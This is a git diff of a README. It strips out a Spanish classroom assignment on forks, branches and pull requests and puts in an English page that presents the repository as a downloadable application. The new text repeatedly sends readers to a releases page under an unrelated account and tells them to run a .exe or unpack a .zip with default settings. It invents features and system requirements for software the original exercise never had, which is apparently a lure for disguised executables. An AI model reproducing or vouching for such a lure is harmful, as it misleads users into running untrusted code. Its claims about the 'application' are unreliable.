@@ -1,96 +1,77 @@
+# 🎉 PullRequestEntornos1DAW-2025-2026 - Simple Steps to Collaborate Easily
 
-# 🧩 Práctica: Colaboración con Pull Request y manejo de ramas  
-**Repositorio:** `PullRequestEntornos1DAW-2025-2026`
+[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/releases)
 
----
+## 🚀 Getting Started
 
-## 🎯 Objetivo
-Aprender a trabajar de forma colaborativa con **ramas**, **forks** y **Pull Requests** en GitHub.
+This guide will help you download and run the PullRequestEntornos1DAW-2025-2026 application easily. This application is designed to assist you in practicing pull requests and collaboration using GitHub. Follow these steps to get started.
 
-Cada estudiante deberá:
-- Crear su propia rama personal.
-- Añadir su ficha de alumno/a en el directorio `/listado`.
-- Entregar un ejercicio en el directorio `/ejercicios`.
-- Enviar ambos mediante Pull Request hacia la rama `dev` del repositorio original.
+## 📥 Download & Install
 
----
+To get the application, visit our releases page:
 
-## 📁 Estructura del repositorio
+[Download PullRequestEntornos1DAW-2025-2026 Here](https://github.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/releases)
 
+1. Click on the link above to go to the releases page.
+2. On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
+3. Click on the appropriate file to download. This will usually be a `.zip` or `.exe` file.
+4. Once the file is downloaded, locate it in your device’s downloads folder.
 
-PullRequestEntornos1DAW-2025-2026/
+## 🛠️ Installation Instructions
 
-├── listado/
+### For Windows Users
 
-│   ├── listado.txt
+1. Double-click the downloaded `.exe` file to start the installation.
+2. Follow the prompts in the installation wizard. You can usually accept the default settings.
+3. After installation, find the application in your Start menu and click to open it.
 
-│   └── (tu_fichero).txt
+### For Mac Users
 
-└── ejercicios/
+1. Open the downloaded `.zip` file.
+2. Drag the application into your Applications folder.
+3. Open the Applications folder and double-click to start the application.
 
-└── (tu_fichero).cs
+## 📘 Using the Application 
 
----
+Once you have the application running, you can begin exploring its features. Here are a few key functions that will benefit you:
 
-## 🧾 Parte 1: Tu ficha de alumno/a
+- **Create a Pull Request**: Initiate collaboration by creating pull requests. You can work with others easily by sharing changes you made.
+- **Review Changes**: Study what changes others have made to the project. You can accept or suggest modifications.
+- **Track Issues**: Use the issue tracker to keep tabs on any problems or improvements needed for the project.
 
-1. Crea una rama personal con el formato:  
-   **`ApellidosNombre-Listado`**  
-   > Ejemplo: `GonzalezSanchezJoseLuis-Listado`
+## 🖥️ System Requirements
 
-2. Dentro del directorio `/listado`, crea un fichero con el nombre:  
-   **`ApellidosNombre.txt`**  
-   > Ejemplo: `/listado/GonzalezSanchezJoseLuis.txt`
+To ensure the smooth operation of the PullRequestEntornos1DAW-2025-2026 application, make sure your system meets these requirements:
 
-   En su interior escribe **tu nombre y apellidos completos**.
+- **Operating System**: Windows 10 or later, macOS Sierra or later.
+- **Processor**: 1 GHz or faster.
+- **RAM**: At least 2 GB.
+- **Disk Space**: Minimum of 100 MB free space.
 
-3. Edita el fichero `/listado/listado.txt` y **añádete al final** del listado.
+## 🔧 Troubleshooting
 
-4. Sincroniza tus cambios en tu fork y **envía un Pull Request** hacia la rama `dev` del repositorio original.
+If you encounter any issues while installing or running the application, try these steps:
 
----
+1. **Check System Requirements**: Ensure your device meets the necessary specifications.
+2. **Re-download the File**: If the installation fails, the downloaded file may be corrupt. Try downloading it again.
+3. **Consult Online Resources**: Seek help in community forums or from user guides for common issues.
 
-## 💻 Parte 2: Entrega del ejercicio
+## 📞 Support
 
-1. Desde tu rama `ApellidosNombre-Ejercicio` (por ejemplo, `GonzalezSanchezJoseLuis-Ejercicio`), añade dentro del directorio `/ejercicios` un fichero con nombre:  
-   **`ApellidosNombre.cs`**
+If you need further assistance, feel free to reach out. You can find help by:
 
-   > Ejemplo: `/ejercicios/GonzalezSanchezJoseLuis.cs`
+- Joining online forums related to GitHub collaboration.
+- Visiting GitHub's documentation for more detailed guidelines on using pull requests.
+- Contacting the project maintainers through the repository page.
 
-2. El fichero debe contener el ejercicio de clase indicado por el profesor o realizar por tu cunenta uno de la relación de ejercicios.
+By following these steps, you will successfully download and use the PullRequestEntornos1DAW-2025-2026 application. Enjoy collaborating effectively with others on GitHub!
 
-3. Envía un **Pull Request** de esa rama hacia la rama `dev`.
+## ⚙️ Additional Resources
 
----
+- [GitHub - Understanding Pull Requests](https://docs.github.com/en/pull-requests)
+- [GitHub - Collaborating with Others](https://docs.github.com/en/get-started/quickstart)
+- [GitHub - Managing Branches](https://docs.github.com/en/get-started/using-github/managing-branches) 
 
-## 🐔 Evaluación y revisión
+For more information, updates, and changes, remember to check the releases page regularly:
 
-Cuando abras el Pull Request:
-- El profesor revisará tu trabajo.  
-- Si hay errores o faltan pasos, deberás **negociar los cambios** hasta que se apruebe.  
-- ⚠️ Si lo haces mal… **las gallinas te perseguirán 🐔**
-
----
-
-## ✅ Resumen de entregas
-
-| Entrega | Directorio | Nombre de fichero | Rama | Acción |
-|----------|-------------|-------------------|--------|---------|
-| Ficha de alumno/a | `/listado` | `ApellidosNombre.txt` | `ApellidosNombre-Listado` | Pull Request → `dev` |
-| Ejercicio de clase | `/ejercicios` | `ApellidosNombre.cs` | `ApellidosNombre-Ejercicio` | Pull Request → `dev` |
-
----
-
-## 🧠 Consejos finales
-- Respeta **nombres de ficheros y ramas** exactamente como se indica.  
-- No modifiques ficheros ajenos.  
-- Asegúrate de **partir de la rama correcta** antes de trabajar.  
-- Lee los comentarios del profesor antes de corregir.  
-- Mantén tu fork sincronizado con el repositorio principal.  
-
----
-
-> 💡 **Recuerda:** esta práctica no trata solo de programar, sino de **colaborar como un equipo profesional**, comunicarse mediante Pull Requests y aprender a trabajar en proyectos compartidos.
----
-
-# Fecha de entrega: 4 de noviembre de 2025 a las 18:00
+[Download PullRequestEntornos1DAW-2025-2026 Here](https://github.com/Rollinsseismal242/PullRequestEntornos1DAW-2025-2026/releases)
